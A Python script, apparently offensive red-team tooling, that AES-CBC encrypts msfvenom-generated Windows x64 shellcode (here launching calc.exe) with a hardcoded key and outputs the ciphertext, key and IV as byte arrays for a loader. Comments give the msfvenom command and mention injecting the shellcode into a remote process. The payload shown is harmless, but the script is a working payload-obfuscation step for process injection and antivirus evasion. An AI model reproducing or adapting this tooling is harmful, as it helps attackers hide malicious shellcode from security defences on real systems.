
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
from os import urandom

# AES = key_expansion + key_add_roundKey + (key_substitution + shif_rows + mix_columns + key_add_roundkey) x (round-1) + (key_add_roundKey + key_substitution + shif_rows)
# AES key_size = 128 bits (round = 10), or 192 (round = 12), or 256 (round = 14)
# AES cyphr mode = CBC(Cipher Block Chaining = Each block of plaintext is Xored with the previous ciphertext block. The first block is Xored iwth an initial vector), 
# or ECB(Electronic Codebook = Each block of plaintext is encrypted independently), 
# or CFB(Cipher Feedback Mode = Encrypts smaller chunks of 1 byte and Xors plaintext with the output of the encrypted previous ciphertext.  The first byte is Xored iwth an initial vector) 
# or GCM

# msfvenom -p windows/x64/exec CMD="cmd.exe /C calc.exe" EXITFUNC=thread
# --platform windows -a x64 -b "\x00\x0a\x0d" -e <any invalid encoder> -f py -v code
# Invalid encoder will force msfvenom to generate a raw shellcode before formating it in pytho style
# The raw shellcode is smaller and reduce the risk of memory access violation when injected in the remote process

code =  b""
code += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
code += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
code += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
code += b"\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
code += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
code += b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
code += b"\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
code += b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"
code += b"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
code += b"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
code += b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
code += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
code += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
code += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
code += b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
code += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
code += b"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48"
code += b"\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d"
code += b"\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5"
code += b"\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
code += b"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
code += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89"
code += b"\xda\xff\xd5\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f"
code += b"\x43\x20\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"

#code = b"Patrick Janwouo: Senior red team operator | Offensive tool developer"

key = b"#shellcodefacile#shellcodefacile"

def bytes_to_string(data):
    str_result = "{"
    for b in data:
        str_result += "0x{:02x},".format(b)
    str_result = str_result[:-1]
    str_result += "}"
    return str_result


if __name__ == "__main__":

    initialization_vector = urandom(16)
    padder = padding.PKCS7(128).padder() # 128 bits = 16 bytes
    cipher = Cipher(algorithms.AES(key), modes.CBC(initialization_vector))
    aes_encryptor = cipher.encryptor()

    padded_code = padder.update(code) + padder.finalize()
    encrypted_padded_code = aes_encryptor.update(padded_code) + aes_encryptor.finalize()
    with open("calc.aes", "wb") as f:
        f.write(encrypted_padded_code)

    print("\n\nAES mode CBC 128 bits(16 bytes)")
    print("key: {}, size: {} bytes\n".format(bytes_to_string(key), len(key)))
    print("initialize vector: {}, size: {} bytes\n".format(bytes_to_string(initialization_vector), len(initialization_vector)))
    print("encrypted datas: {}\n".format(bytes_to_string(encrypted_padded_code)))